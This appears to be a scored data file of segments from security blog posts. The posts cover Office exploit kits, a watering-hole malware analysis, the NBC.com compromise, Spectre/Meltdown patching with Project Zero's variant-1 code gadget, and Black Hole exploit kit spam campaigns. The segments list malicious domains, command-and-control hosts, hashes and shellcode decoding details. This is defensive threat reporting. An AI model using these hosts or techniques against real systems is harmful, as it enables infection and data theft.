191FFA6EB2C33A56E750BFFEFFE169B0D9E4BBE4
4B2F4C20CC9294F103319938F37C99C0DE7B4932
3FCEA1AFDA9888400D8DE5A232E4BF1E50D3380F
CA750F492691F4D31A31D8A638CE4A56AF8690D0
1374EE22D99ECFC6D68ADE3ACE833D4000E4705B
6BF1A2B7E8CA44E63E1A801E25189DC0212D71B9
B84AB2D5EAD12C257982386BC39F18532BF6939E
476A0455044B9111BDA42CDB7F4EA4E76AA7AB2D
0C1CA7D9C7E4B26A433946A6495782630EF6FD18
29B6DD92FBDF6070B171C38B1D3CA374F66E4B66
89DA7E7A88F9B6CBBFAF7F229BFEA8767220C831
CEE32C8E45A59D3084D832A9E6500AE44F75F7B5
A152AB43BEDCD8F6B7BFB67249C5599CF663D050
3AC722AC0D4764545A3E8A6DF02059C8A164CA17
25E0474E4F8D7D3053278B45A9C24380275B4705
35FB5F3C2957B4525A0330427397915AEEFDDD91
19EEE9745E25194DD573423C6DB0F5AF5D8CFE1D
E88B2B7A08322738C74B29C4CA538741F85A0B7F
A388A2A241339489685CB4AD22EBA9E04B72CD67",0.03798656669528022
Flash files,0.008470598804826368
"BADAE04BFF7AFD890C3275E0434F174C6706C2C6
6EF95ACB8AA14D3BA8F1B3C147B7FB0A9DA579A2
10840AEB8342A26DFC68E0E706B36AC2B5A0D5B2
093B25B04FE21185BFEEAFD48F712942D3A3F0C6
C680734AF8670895F961C951A3629B5BC64EFE8E
EEDBBB65A441979974592343C6CA71C90CC2550F
DE288CADE8EE3F13D44719796A5896D88D379A1E
9488CDBB242BE50DF3D20B12F589AF2E39080882
B664365FC8C0B93F6A992C44D11F44DD091426DD
7557B5D987F0236FF838CD3AF05663EFA98EBC56
24B7933A8A8F6ED50FBAF2A5021EF47CE614A46F
11BA8B354001900ED79C43EA858F1BC732961097",0.026644305854995554
Appendix 3 – URL samples,0.008439686583734618
TinyURL.com,0.00868136327608604
"/jf67ejb
/jqp7efh
/j56ks2b
/gplnhvm
/gwwltaf
/hgnsysa
/hvfnohs",0.012808640505927782
Stegano exploit kit landing pages,0.007717955986999536
"hxxp://conce.republicoftaste.com/urq5kb7mnimqz/3dyv72cqtwjbgf5e89hyqryq5zu60_os24kfs1j3u_i
hxxp://compe.quincephotographyvideo.com/kil5mrm1z0t-ytwgvx/g7fjx4_caz9
hxxp://ntion.atheist-tees.com/v2mit3j_fz0cx172oab_eys6940_rgloynan40mfqju6183a9a4kn/f
hxxp://entat.usedmachinetools.co/6yg1vl0q15zr6hn780pu43fwm5297itxgd19rh54-3juc2xz1t-oes5bh
hxxp://connt.modusinrebus.net/34v-87d0u3
hxxp://ainab.photographyquincemiami.com/w2juxekry8h9votrvb3-k72wiogn2yq2f3it5d17/j9r
hxxp://rated.republicoftaste.com/6t8os/lv-pne1_dshrmqgx-8zl8wd2v5h5m26m_w_zqwzq
hxxp://rence.backstageteeshirts.com/qen5sy/6hjyrw79zr2zokq1t4dpl276ta8h8-/3sf9jlfcu0v7daixie_do6zb843/z7
",0.016934407694653153
Cybercriminals shift their tactics for Microsoft Office document exploitation – SophosLabs research,0.00951797758408468
"Written by
Editor",0.007990427730288352
"July 18, 2016",0.008790310083003128
Threat Research CVE-2015-1641 CVE-2015-2545. SophosLabs,0.00816386123646684
"This latest technical paper from our team in SophosLabs examines the newest techniques being used by cybercriminals to conduct Microsoft Office document exploits.
For four years, the preferred vulnerability for a document exploit attack was CVE-2012-0158, but as this vulnerability has aged out – due to users and administrators updating and patching their systems to remediate it – criminals have had to target new vulnerabilities to keep up their attacks.
SophosLabs has found that criminals using several popular exploit kits, including Microsoft Word Intruder, are now predominantly targeting CVE-2015-1641 and CVE-2015-2545.",0.013335954094747637
"Along with these new vulnerabilities, these Microsoft Office document exploit kits also have strengthened their tactics and added new complexities to their attacks. For example, the newest version of the Microsoft Word Intruder now includes the ability to deploy a decoy document, as well as new payload files that are relocated to the end of the exploit block. The decoy document allows the attackers to better hide their tracks while the exploit is at work.
Despite all these changes, one thing that hasn’t really changed is the delivery system. These exploits are still sent via email – regardless of whether it’s a 0-day targeted attack or a large-scale attack on a wide audience.
These emails use common social engineering methods to urge the recipient to open the malicious attachment, which generally looks like a Microsoft Word document in DOCX format. Often the payload from these attacks will point the victim to a command-and-control server that hosts webpages to phish additional credentials, such as email, from the victim.
For an in-depth examination of exploit kits using CVE-2015-1641 and CVE-2015-2545, be sure to download the paper, as well as all our other SophosLabs research, on our technical papers page.
About SophosLabs
SophosLabs is the global network of threat centers staffed by Sophos researchers and analysts.
You can find our industry-leading research and technical papers, expert opinion, and security advice at Naked Security and right here on the Sophos Blog.
Sign up for our Sophos Blog newsletter, follow us on your favorite social media networks, chat with us in our forums, download our informative podcasts, or sign up for our RSS feeds.",0.01328251035978989
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
The CVE-2012-4792 and the Spear-Phishing Rotary Domains (Part 2),0.012025785952403445
"In the previous part of our report, we analyzed  the malicious content detected in the domain ""rotary-eclubtw.com"". We detected the exploitation code for the vulnerability CVE-2012-4792 and analyzed the Flash file which was used to contain the heap spray code and the shell code. In this part we are going to show some of the details that we extracted from the shell code and from behavioral analysis of the malware installed after a successful exploiting attempt. We have also added some details related to the domain name using the WHOIS records and internal data.",0.010469084666112738
"Why are waterhole attacks occurring? What is the attackers' objective, both here and in other cases? As we learned from this analysis, the malware is used to steal files from compromised computers, while also enabling monitoring of the user's emails and other activities. We also found suspicious ties to sites potentially targeting high technology suppliers, perhaps in Taiwan. Read on for details of the attack.",0.01308432143999283
"From the shellcode contained in the SWF file mentioned in the first part of this blog, we have extracted and disassembled, specifically, the Windows XP shellcode. To do this, we used the tool shell2exe which allowed us to obtain a consistent PE file by inputting the sequence of bytes of the shellcode. There is also an online version of this tool provided by sandsprite.org. In the following screenshot we can see the first stage which decrypts the remaining code using the XOR key ""2Eh"":",0.012924199639567258
"After this first stage the execution flow is passed to the code just decrypted, which, as its first action, tries to create a file in the operating system temp path named ""dw20.exe"":",0.013930800575938873
"Another interesting detail is the search in memory for the string ""KONG"" which as mentioned in the first part of our analysis, has been used as a prefix of the content of the variable ""THISISIT"" in the first HTML code from which we started this analysis. So, once this string is detected in memory, the file created previously, ""dw20.exe"", is filled up with the value of the array ""THISISIT"" stripped of the marker ""KONGK"":",0.015182787767676342
"Once the encoded file is detected in memory it is passed to another assembly routing which applies another XOR operation using the key ""BFh"":",0.009766039295726725
"Following the logic of the shell code, we had extracted the encoded stream and applied the XOR on it, obtaining a file with MD5: 1ad6afeec913f4c3a0ffce0093cddf21. At this time the file seems to have a low detection as reported here. We submitted this file to the Websense® ThreatScope™ service with the following result:",0.011007473002145773
The full report is available here. The initial lookup of this .EXE file seems to produce some suspicious details. Firstly it is signed with an invalid certificate as shown below:,0.009636607718497059
"A suspicious resource section named  ""DATA"" was also detected, which is loaded and decrypted at runtime:",0.007375962882122833
"The code where this resource is referenced was found during the dynamic analysis, and is loaded afterwards by the function called at the address 0x00403f02:",0.009091681559669884
"Following the execution of this file, we noticed the creation of the file ""ntshrui.dll""  and the use of the Windows system file: ""wdmaud.drv"":",0.008104054906886593
"The file ""ntshrui.dll"" has been submitted to Virustotal and the report again shows a low detection of malware, but thanks to these two file names we located a Microsoft report, from which we can deduce that we are talking about the same family of malcode (named Fucobha.A). From the Microsoft analysis it is also possible to see that while this malware is used specifically to download files from the impacted systems, it also permits monitoring of emails and the user's activity. Also, the report shows that the same behavior is used in the persistence mechanism as an injection in a new instance of the process ""explorer.exe"" as shown here:",0.015331008510449218
"In the previous screenshot, it is possible to see unusual network activity in the process ""explorer.exe"" - in fact, once executed, the malware contacts the host ""hxxp://www.rotary-eclub.com"" ( IP address 118.212.64.23 TCP port 4356 ) to start sending information gathered from the impacted system as follows:",0.01074670662426569
"As is possible to see from the network traffic, the information exchanged between the impacted system and the C&C is encrypted:",0.008291527421987022
"The first message contains encrypted basic information (such as the operating system version, installed service pack, local IP address and so on) for the impacted system.  We tried to analyze the injected code in the process ""explorer.exe"" and discovered the parser that handles the commands once they are decrypted. Here we can see the check for two specific commands: ""ptt"" and ""skc"":",0.00890799552090693
"The WHOIS information for the C&C ""hxxp://www.rotary-eclub.com"" provides a strong link with the host ""hxxp://www.rotary-eclubtw.com"" as shown below:",0.01707635410670172
Here is the WHOIS information for the C&C domain:,0.012016952213824594
"By googling for YOVOLE.COM, we found that this Chinese Service Provider has been reported as one of the most active for phishing related attacks as detailed in this report. Also, using our internal database we detected that the registrant ""2207406762@qq.com"" has recently registered other interesting domain names. Specifically:",0.012663785747034861
From this it is possible to detect a weird coincidence: zhiaoit and zy-intl are keywords which on Google provide results related to high technology suppliers as shown below:,0.012259495595668857
"Still another note: using the location address gathered from the WHOIS information, we can see via Google Maps the geographical location where the C&C is hosted is actually just across from the island of Taiwan:",0.017354084146135484
"Websense customers are protected from these and other threats by Websense ACE (Advanced Classification Engine).
",0.012845929380273069
"NBC.com infected with malware for more than 24 hours?
NBC.com may have sent visitors to infected URLs serving up Trojan software (RedKit) for 24 hours. At the time of this blog post ESET researchers still see some related sites similarly compromised.",0.011868371625058605
21 Feb 2013 - 09:04PM,0.012262981153105201
NBC.com may have sent visitors to infected URLs serving up Trojan software (RedKit) for 24 hours. At the time of this blog post ESET researchers still see some related sites similarly compromised.,0.010641623638524056
"Updated: February,  22. 3:00AM GMT.",0.01529304426645306
"Another high profile website has been hacked to redirect visitors to malicious URLs, websites that seek to infect visitors for further scamming and cyber fraud. Last week it was Facebook, this time it is the website of the National Broadcasting Company (NBC). The major American television network’s site at NBC.com was blocked for a time today by some web browsers, but untold thousands of visitors were exposed to infection.",0.0139333840885143
Early indications are that the NBC.com site was in this infectious state for at least 24 hours.,0.013908222020212802
"Through ESET’s LiveGrid we can see the first reports of this infection were received February 20, at roughly 17:00 CET. Then there was a long gap until noon on February 21 (CET) when the reports started flooding in. It’s not clear whether the site was or was not infected during all of this time, but it could have been infected for a while with the iframe pointing to a non-existent location (in which case our backend processes would not have encountered any malicious content).",0.012647161016310693
"These attacks are employing iframes like the one seen here on NBC.com, to redirect legitimate visitors from NBC.com to an infected site that serves up an exploit kit.",0.012546042422839188
A series of different websites have been compromised during this attack and are pointed to by the iframe. The above is just one of them. ESET has been updating its blocking of these sites throughout the duration of the campaign. These include but are not limited to:,0.011671754992442884
"During the attack, ESET products blocked the main NBC website to prevent users being compromised. Now that the site has been completely cleaned, ESET has removed the block. Several other related sites are still infected, exposing the users to risk. These will stay blocked until the site is cleaned. Here is what happens when an ESET Smart Security user tries to go to one of those blocked sites, or is directed there by an iframe:",0.01258602047784907
"In this particular case, the dangerous content referred to in the ESET warning is the RedKit exploit kit, one of a rapidly growing number of software packages used by criminal hackers to exploit common software vulnerabilities such at the Java vulnerability (CVE-2012-0507) that led to last year’s Flashback Trojan outbreak on Macs.",0.011571633391702196
"The exploit is trying to download multiple files to victim machines. Not surprisingly these files are dubious in character. One of the files being served up is a downloader called Win32/TrojanDownloader.Vespula.AY which, again not so surprising, attempts to download some more artifacts that are currently being analyzed. Other downloads are detected as Trojan.JS/Exploit.Agent.NCX.",0.009664587291291937
"Most of the URLs on the compromised NBC suite pointed to Redkit affected sites, but at least one of them was pointing to a Styx Exploit Pack affected site.",0.013267977679619736
"We suggest all users make sure their antimalware program is up to date and web filtering is turned on. If you see a browser warning that says don’t go to a site, heed that warning, don’t go there, even if the site is a well-known one like NBC.",0.011847129463908534
"We will be updating this story as it develops, here and via Twitter @ESETNA.",0.016010805588198784
"Sébastien Duquette (ESET Malware Researcher, Canada) and Righard Zwienenberg (ESET Senior Research Fellow, Netherlands) provided screenshots and key data points for this article. Thanks!
",0.016209439585047614
"Meltdown and Spectre fallout: patching problems persist
Last week, the disclosure by multiple teams from Graz and Pennsylvania University, Rambus, Data61, Cyberus Technology, and Google Project Zero of vulnerabilities under the aliases Meltdown and Spectre rocked the security world, sending vendors scurrying to create patches, if at all possible, and laying bare a design flaw in nearly all modern processors.
The fallout from these revelations continues to take shape, as new information on the vulnerabilities and the difficulties with patching them comes to light daily. In the days since Meltdown and Spectre have been made public, we’ve tracked which elements of the design flaw, known as speculative execution, are vulnerable and how different vendors are handling the patching process. By examining the applied patches’ impact against one of our own products, Adwcleaner, we found that they are, indeed, causing increases in CPU usage, which could result in higher costs for individuals billed by Cloud providers accordingly.
What is speculative execution?
Speculative execution is an effective optimization technique used by most modern processors to determine where code is likely to go next. Hence, when it encounters a conditional branch instruction, the processor makes a guess for which branch might be executed based on the previous branches’ processing history. It then speculatively executes instructions until the original condition is known to be true or false. If the latter, the pending instructions are abandoned, and the processor reloads its state based on what it determines to be the correct execution path.
The issue with this behaviour and the way it’s currently implemented in numerous chips is that when the processor makes a wrong guess, it has already speculatively executed a few instructions. These are saved in cache, even if they are from the invalid branch. Spectre and Meltdown take advantage of this situation by comparing the loading time of two variables, determining if one has been loaded during the speculative execution, and deducing its value.
As explained in our post last week, the potential danger of an attack using these vulnerabilities includes being able to read “secured” memory belonging to a process. This can do things like reveal personally identifiable information, banking information, and of course usernames and passwords. On cloud environment, these vulnerabilities allow extracting data from the host and other VMs.
Example of speculative execution
Using the Project Zero example below, the process will evaluate the condition if(untrusted_offset_from_caller < arr1->length) at a later time, and start a speculative execution of both branches, leading to two different index2 values. This example corresponds to variant 1 of Spectre (CVE-2017-5753) and works on most Intel, AMD, ARM, and IBM CPUs.",0.012127628891251296
"struct array {
unsigned long length;
unsigned char data[];
};
struct array *arr1 = ...; /* small array */
struct array *arr2 = ...; /* array of size 0x400 */
/* >0x400 (OUT OF BOUNDS!) */
unsigned long untrusted_offset_from_caller = ...;
if (untrusted_offset_from_caller < arr1->length) {
unsigned char value = arr1->data[untrusted_offset_from_caller];
unsigned long index2 = ((value&1)*0x100)+0x200;
if (index2 < arr2->length) {
unsigned char value2 = arr2->data[index2];
}
If the processor predicts that the condition is true, value will load:",0.017070249125027637
unsigned char value = arr1->data[untrusted_offset_from_caller];,0.01297558405820054
"Based on value, it’s possible to load index2, which can be 0x200 or 0x300 due to the bitwise operation:",0.0072295559546359245
unsigned long index2 = ((value&1)*0x100)+0x200;,0.010500216551225239
"The second condition is then executed and the last instruction loads value2 as arr2->data[0x200] or arr2->data[0x300].
Once the initial condition has been evaluated and the processor notices that the execution flow above is wrong, the value of value2 stays in the L1 cache. It’s then possible to compare the loading time of arr2->data[0x200] and arr2->data[0x300], and deduce which one has been evaluated during the speculative execution. From there, it’s easy to figure out related variables: Here the value of arr1->data[untrusted_offset_from_caller] is a value that shouldn’t be possible to retrieve according to the expected code flow, since it allows to leak out-of-bound memory.
In order to exploit this behaviour, the code pattern above has to be present on the victim’s machine. As detailed in Jann Horn’s writeup, a locally installed software, a JIT (Javascript is a particularly interesting candidate), or an interpreter (he used eBPF) meet the requirements.
Four variants
While it was initially reported that Spectre and Meltdown correspond to three vulnerabilities, four variants actually exist:",0.013653170796839142
Spectre:,0.00715086324059111
"Variant 1 – CVE-2017-5753
Variant 2 – CVE-2017-5715",0.01056558310263822
Meltdown:,0.0073941653277502795
"Variant 3 – CVE-2017-5754
Variant 3a – /",0.00906458546968647
"Variants 1 and 2 of Spectre impact Intel, IBM, ARM, and AMD CPUs. Meltdown appears to be exclusive to Intel CPUs, and allows attackers to read privileged memory from an unprivileged context, still using the speculative execution feature. Its variant 3a is exploitable on a few ARM CPUs only.
The fact that these vulnerabilities impact the CPUs themselves make them difficult to patch. A software-only solution may bring important performance issues, as would a hardware-only fix. Thus, various hardware vendors have been working together in the past months working on fixes. However, while major players like Amazon and Microsoft got early access to the vulnerabilities reports, other providers did not. They discovered the vulnerabilities at the same time as the disclosure on January 3.
Vendors band together
Those who weren’t in on the secret formed a task group with other providers in order to exchange information and to pressure hardware manufacturers. Scaleway, OVH, Linode, Packet, Digital Ocean, Vultr, Nexcess, and prgmr.com have been part of it, later joined by Amazon, Tata Communications, and also parts of the RedHat and Ubuntu teams. On January 9, part of the researchers (Moritz Lipp, Daniel Gruss, Michael Schwarz from the Graz University of Technology) who discovered the vulnerabilities also joined in.
Some Open-Source developers also explained that they had not received any information prior the public disclosure, but were actively working on providing patches.
We have received *no* non-public information. I’ve seen posts elsewhere by
other *BSD people implying that they receive little or no prior warning, so
I have no reason to believe this was specific to OpenBSD and/or our
philosophy.
Mitigations began to land upstream in the Linux kernel shortly after the public disclosure to address the vulnerabilities separately. Some require a hardware-vendor-issued microcode to be applied to the processor in order to make the software patch effective. Most of these patches are simply workarounds, however, to avoid making the CPU behave as explained above. We may expect some hardware change in future generations of processors at some point, but there’s no easy, quick fix for now.
Available patches for hardware and OSes
The upstream Linux patch for Meltdown (variants 3 and 3a) takes advantage of KPTI (Kernel Page Table Isolation) and has been backported to Linux 4.14, 4.9 and 4.4. It’s is available in most distribution’s official kernels. Debian has shipped it in most releases, as RedHat has done. Ubuntu published theirs a few hours ago, although some critical issues have been discovered and quickly addressed. Tails published an update, too. The patches for ARM64 haven’t been merged yet but are expected to be merged later.
Variant 1 (Spectre) requires changes to compilers behaviour and Intel suggests adding LFENCE (see 3.1 Bounds Check Bypass Mitigation; other vendors have other suggestions) as a barrier to stop speculation in specific places. This means that the kernel and software has to be recompiled in order to avoid making the processor use the speculative execution when it’s problematic. Again, although we may expect hardware changes in future generations of Intel chips, we can’t expect this to happen for a long time.
Variant 2 (also Spectre) requires both a microcode patch from CPU vendors and a patch from the kernel to leverage IBRS (Indirect Branch Speculation Feature), STIBP, and IBPB. Another suggestion called “retpoline” has been introduced by Paul Turner from Google and is also being implemented in various compilers, including GCC and LLVM, even though some questions still remain about its efficiency on certain CPU models.",0.022037523711285756
"Vulnerability
(Linux) Software mitigation
Hardware mitigation",0.010153100816163385
Meltdown (3 & 3a),0.017501684879801638
"KPTI
Not needed",0.007986722233267463
"Spectre 1
n/a
n/a",0.015432942388443727
"Spectre 2
IBRS / Retpoline
Microcode",0.010723188588731003
Proprietary vendors have also published several updates:,0.00874975029833358
"Apple addressed the two Meltdown variants in iOS 11.2, macOS 10.13.2, and tvOS 11.2. Spectre is being mitigated in iOS 11.2.2 and the macOS 10.13.2 Supplemental Update, even though only recompiled software are an effective mitigation for variant 1.
Google has included some mitigations for the three variants in its Android Security Bulletin on January 5. Note that further mitigations are expected in next month’s updates, especially a kernel with KPTI.",0.01993621432792514
"Regarding Microsoft, the process has been bumpier. They’ve released various fixes for the platform, but made several requirements for the patches for Spectre and Meltdown to be effective:",0.01631490115677947
"If an antivirus solution is registered in the Windows Security Center, it needs to set the following registry key:",0.008690149927747859
"Key=""HKEY_LOCAL_MACHINE"" Subkey=""SOFTWARE\Microsoft\Windows\CurrentVersion\QualityCompat"" Value=""cadca5fe-87d3-4b96-b7fb-a231484277cc"" Type=""REG_DWORD”
Data=""0x00000000”",0.013508451010711409
"Only then can the January Patch Tuesday patch be applied. Note that Malwarebytes users have been able to successfully receive the patch since its publication.
2. As pointed out by Kevin Beaumont, a specific manipulation must be done on Windows Server to apply the patch and enable it. After creating the following keys and restarting the host, the mitigation should be in place:",0.008998331876873045
"reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management” /v FeatureSettingsOverride /t REG_DWORD /d 0 /f
reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management” /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f
reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization” /v MinVmVersionForCpuBasedMitigations /t REG_SZ /d “1.0” /f",0.0188300896836614
"A few moments later, users began to report computers running with AMD processors becoming unbootable after applying the patch. Microsoft has stopped delivering the patch to those configurations while working with AMD to find a solution.
Available software patches
Apart from hardware manufacturers and OS vendors, software editors have also been quick to mitigate the exploitation of Spectre. Browser vendors and virtualization solutions are particularly exposed to these vulnerabilities and have been the fastest to respond.",0.012019986622788803
"Xen published an advisory sharing details about the vulnerabilities in its hypervisor’s scope alongside a documentation page explaining how to mitigate.
Mozilla released Firefox 57.0.4 soon after publishing an article explaining how they managed to exploit Spectre remotely using Javascript and WebAssembly. This update makes time source less precise, thus making the exploitation a lot more unreliable while more in-depth fixes are engineered.
Google Chrome followed shortly after with an explanatory article about how Spectre could be exploited using WebKit’s JavascriptCore and listing the upcoming mitigations in Webkit.",0.015900839885728324
"Numerous Proof of Concepts have been published to demonstrate the exploitation of the different variants, from reconstructing an image to applying it against a specifically-crafted Intel SGX enclave. It’s also possible to test if mitigations are in place: Microsoft released a solution that can be used remotely based on the new PowerShell SpeculationControl module, and several solutions are available on Linux-based OSes.
Patches impact on AdwCleaner’s infrastructure
Disclaimer: The following is not a benchmark, but feedback based on what we have observed in our hardware environment and software stack. The observed behaviour is highly dependent on the workload, and there may be no changes observed in yours.
As part of our security process, we’ve applied fixes as soon as they were made available by our distributions and hosting providers. We were expecting some performance increase, especially on AdwCleaner storage backend, but it was hard to quantify.
CPU load before and after KPTI patch on AdwCleaner storage backend.
After applying the new Linux kernel with the KPTI backport, we’ve observed a 10 to 15 percent increase of CPU usage. (We applied the patch slightly before 00:00 UTC on January 6). These servers do not take advantage of PCID, which could make the difference in performance less visible. As this usage increase appears to be the new baseline for some time, this is likely to at least temporary lead to important cost increases for users of providers billing based on CPU usage, although some providers are reported working with severely impacted customers.
As the situation still evolves quickly every day, some updates may be added to both the original story and this blogpost.
Particularly interesting literature:",0.014142865715149555
"ARM Whitepaper – “Vulnerability of Speculative Processors to Cache Timing Side-Channel Mechanism”
",0.015219406971954563
Forcepoint Updates on Spectre and Meltdown,0.012244918098996638
"The year 2018 has gotten off to a tough start with the news of the Meltdown and Spectre (CVE-2017-5715, CVE-2017-5753, and CVE-2017-5754) vulnerabilities. This is a broad industry problem that affects almost everyone, everywhere. Processors from Intel, AMD, and ARM are all potentially vulnerable to at least one variant of Spectre or Meltdown which can be implemented within Apple, Linux and Windows environments. However, currently we are unaware of active exploits of this in the wild.
Forcepoint is working with our industry partners to examine these issues carefully and analyze the potential impact to our products, customers and resellers. While updates to systems may be required, due to the way our appliances and cloud operate, we can report today that our exposure is limited, as only our own trusted code should be running on these devices. As soon as patches are made available, Forcepoint will rigorously test these in our performance laboratory and will carefully assess the safest and most pragmatic way to proceed for our customers and partners.
It is important to note for someone to make use of the Spectre/Meltdown attacks requires malicious code to be executed on the target system. This is not a trivial point as the attack path is more complex than a simple phishing attack, for example.
We will continue to update our Forcepoint Security Labs and Insights blogs as well as our Knowledge Base technical articles as new information becomes available.
For the latest information on how this issue affects Forcepoint security products, please see the technical bulletin: Meltdown and Spectre Vulnerability.
Forcepoint Resources on Spectre and Meltdown",0.012200112205673519
"Article from Forcepoint chief scientist Dr. Richard Ford: Meltdown & Spectre: Computing's 'Unsafe at Any Speed' Problem
Forcepoint Security Labs initial analysis: The Looming Spectre of a Meltdown
Master Forcepoint Knowledge Base Article 000014933: Meltdown and Spectre Vulnerability
Product updates to Forcepoint Knowledge Base Article:",0.01637058542144676
"Forcepoint Web Security (https://support.forcepoint.com/KBArticle?id=000014948)
Forcepoint NGFW (https://support.forcepoint.com/KBArticle?id=000014989)
Forcepoint SMC Appliances (https://support.forcepoint.com/KBArticle?id=000014991)
Sidewinder (https://support.forcepoint.com/KBArticle?id=000014992)
",0.015660705081890214
"Cybercriminals are currently mass mailing millions of emails impersonating Microsoft Corporation in an attempt to trick users into clicking on a link in a bogus ‘License Order” confirmation email. Upon clicking on the link, users are exposed to the client-side exploits served by the latest version of the Black Hole Exploit Kit.
More details:",0.01466228044928819
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample compromised URL used in the campaign: hxxp://kalender.mn-welt.de/page2.htm
Sample client-side exploits serving URL: hxxp://fidelocastroo.ru:8080/forum/links/column.php
Sample payload serving URL: hxxp://fidelocastroo.ru:8080/forum/links/column.php?sojhnkxv=030a380233&vjmm=3307093738070736060b&qkzwsj=03&jqgvx=hszplzo&maxtgox=obazeot
Sample client-side exploit served: CVE-2010-0188
Malicious domain name reconnaissance:
fidelocastroo.ru – 209.51.221.247; 203.80.16.81
Name server: ns1.fidelocastroo.ru – 85.143.166.170
Name server: ns2.fidelocastroo.ru – 132.248.49.112
Name server: ns3.fidelocastroo.ru – 84.22.100.108
Name server: ns4.fidelocastroo.ru – 213.251.171.30
The following domains also respond to 209.51.221.247:
kennedyana.ru
leprasmotra.ru
windowonu.ru
bakface.ru
wikipediastore.ru
linkrdin.ru
secondhand4u.ru
We’ve already seen secondhand4u.ru and linkrdin.ru used in the previously profiled “‘Fwd: Scan from a Xerox W. Pro’ themed emails lead to Black Hole Exploit Kit” malicious campaign, indicating that both campaigns have been launched by the same party.
Upon successful client-side exploitation, the Microsoft Windows License themed campaign drops MD5: d5211a7882c3c3e66f4a7db04c2a0280 – detected by 37 out of 44 antivirus scanners as Trojan.Win32.Bublik.obv
Once executed, the sample creates the following file on the affected host: %AppData%KB00121600.exe – MD5: D5211A7882C3C3E66F4A7DB04C2A0280 – detected by 37 out of 44 antivirus scanners as Trojan.Win32.Bublik.obv
It then phones back to 188.40.0.138:8080/AJtw/UCygrDAA/Ud+asDAA (AS24940). We’ve already seen the same pseudo-random characters used in the “‘American Express Alert: Your Transaction is Aborted’ themed emails serve client-side exploits and malware” campaign.
More MD5s are known to have phoned back to the same IP in the past. For instance:
MD5: 850c3b497224cee9086ad9ad6a2f71e6 – detected by 4 out of 44 antivirus scanners as UDS:DangerousObject.Multi.Generic
MD5: 2c20575eb1c1ac2da222d0b47639434e – detected by 34 out of 44 antivirus scanners as Trojan-Ransom.Win32.PornoAsset.ascm
MD5: d9eaad9b06e500f7a0cd90a02f537364 – detected by 29 out of 44 antivirus scanners as PWS:Win32/Zbot
MD5: 92978246ab42f68c323c36e62593d4ee – detected by 31 out of 43 antivirus scanners as HEUR:Trojan.Win32.Invader
MD5: 03f5311ef1b9f7f09f6e13ff9599f367 – detected by 35 out of 44 antivirus scanners as Worm:Win32/Cridex.E
MD5: d343eb0ab2703ae3623eb1504f321018 – detected by 37 out of 44 antivirus scanners as Worm:Win32/Cridex.E
MD5: 7b9f0a74820a00b34cc57e7c02d1492c – detected by 39 out of 44 antivirus scanners as W32.Cridex
MD5: cdbc0ba05ce8214d8877c658b648bc7e – detected by 36 out of 44 antivirus scanners as W32.Cridex
MD5: 7515448fa3aa1ee585311b80dab7ca87 – detected by 38 out of 44 antivirus scanners as Trojan-Ransom.Win32.PornoAsset.aaql
MD5: 19f481447e1adf70245582d4f4f5719c – detected by 40 out of 43 antivirus scanners as Worm:Win32/Cridex.E
MD5: ABD0A8FCF1B728B14A9412F6ECF32586 – detected by 27 out of 44 antivirus scanners as Heuristic.BehavesLike.Win32.Suspicious-BAY.K
MD5: 63F0092762566A87BE777A008CE3C511 – detected by 31 out of 44 antivirus scanners as Trojan.Reveton.AN
MD5: BFFC8545808E0F5E1148BDD2A0FBF79E – detected by 39 out of 43 antivirus scanners as Worm:Win32/Cridex.E
MD5: C83877421A4A88B38F155DF2BF786B6A – detected by 24 out of 44 antivirus scanners as Gen:Variant.Kazy.105014
MD5: C379D30CCDC4A57088F8D137DF525CCD – detected by 29 out of 44 antivirus scanners as Trojan.Win32.Bublik.nrz
MD5: 42F36DB25B25196B454771751F8C1B89 – detected by 35 out of 44 antivirus scanners as Malware.Cridex
MD5: 3A8CE3D72B60B105783D74DBC65C37A6 – detected by 33 out of 42 antivirus scanners as Trojan.Win32.Bublik.ols
MD5: EB242D0BFCE8DAA6CC2B45CA339512A0 – detected by 25 out of 43 antivirus scanners as Win32:LockScreen-LV [Trj]
MD5: CDBC0BA05CE8214D8877C658B648BC7E – detected by 36 out of 44 antivirus scanners as Win32:Kryptik-KGB [Trj]
MD5: 733D33FF69013658D50328221254E80C – detected by 25 out of 43 antivirus scanners as Win32.Citadel
MD5: 963FE8239C00318DFF5BF55B866252C3 – detected by 39 out of 44 antivirus scanners as Trojan:W32/Injector.AH
MD5: 0D4FE02D89102B67A722027759EB40D1 – detected by 40 out of 44 antivirus scanners as Gen:Variant.Kazy.102147
MD5: F8254130C26B227616C0939FBE73B9C7
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.011449765899519737
"Cybercriminals are currently spamvertising millions of emails impersonating Intuit, in an attempt to trick end and corporate users into clicking on the malicious links found in the emails.
The emails pretend to be coming from Intuit’s PaymentNetwork and acknowledge the arrival of an incoming payment. In reality though, they redirect users to a Black Hole exploit kit landing URLs where client-side exploits are served, and ultimately malware is dropped on the infected hosts.
More details:",0.011274277689073298
Screenshot of the spamvertised Intuit themed malicious email:,0.009186899504533441
"Upon clicking on the links found in the email, users are exposed to the following bogus “Page loading…” page:",0.010056855764312589
"Spamvertised URLs: hxxp://sklep.kosmetyki-nel.pl/intpmt.html; hxxp://kuzeybebe.com/o3whbp0G/index.html; hxxp://senzor.rs/prolintu.html
Client-side exploits serving URLs: hxxp://69.194.194.238/view.php?s=2acc7093df3a2945; hxxp://proamd-inc.com/main.php?page=8cb1f95c85bce71b; hxxp://thaidescribed.com/main.php?page=8cb1f95c85bce71b
Client-side exploits served: CVE-2010-1885
Upon successful client-side exploitation, the campaign drops MD5: 4462c5b3556c5cab5d90955b3faa19a8 on the exploited hosts. The sample is detected by 29 out of 41 antivirus scanners as Worm.Win32.Cridex.fb; Worm:Win32/Cridex.B
Upon execution, the sample phones back to renderingoptimization.info – 87.255.51.229, Email: pauletta_carbonneau2120@quiklinks.com on port 443.
Here is information on Intuit’s Online Security Center about this threat.
Webroot SecureAnywhere users are proactively protected from the client-side exploitation.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.008532231618005426
